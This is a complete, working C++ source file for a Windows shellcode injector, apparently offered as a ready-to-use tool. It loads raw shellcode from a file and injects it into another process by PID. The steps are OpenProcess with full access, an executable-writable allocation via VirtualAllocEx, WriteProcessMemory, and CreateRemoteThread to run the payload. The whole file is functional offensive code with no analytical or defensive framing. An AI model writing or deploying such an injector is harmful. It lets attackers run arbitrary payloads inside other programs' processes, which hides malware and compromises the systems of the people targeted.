#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

// Function to read shellcode from file
std::vector<unsigned char> ReadShellcode(const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Usage: SimpleInjector.exe <Target Process PID> <Path to shellcode.bin>" << std::endl;
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* shellcodePath = argv[2];

    // Read shellcode
    auto shellcode = ReadShellcode(shellcodePath);
    if (shellcode.empty()) {
        std::cout << "Error reading shellcode." << std::endl;
        return 1;
    }

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "Error opening process." << std::endl;
        return 1;
    }

    // Allocate memory in target process
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMemory) {
        std::cout << "Error allocating memory." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Write shellcode to remote memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteMemory, shellcode.data(), shellcode.size(), &bytesWritten)) {
        std::cout << "Error writing memory." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create remote thread to execute shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMemory, NULL, 0, NULL);
    if (!hThread) {
        std::cout << "Error creating remote thread." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait and clean up
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "Injection successful." << std::endl;
    return 0;
}